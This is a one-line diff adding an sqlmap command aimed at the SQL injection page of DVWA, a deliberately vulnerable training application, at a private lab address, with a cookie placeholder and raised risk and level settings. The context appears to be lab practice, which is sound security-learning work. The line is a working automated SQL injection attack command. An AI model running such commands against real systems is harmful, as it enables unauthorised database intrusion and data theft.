@@ -1,0 +1,1 @@
+sqlmap -u "http://192.168.56.102/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="<COOKIE_VALUE>" --risk=2 --level=2 --batch
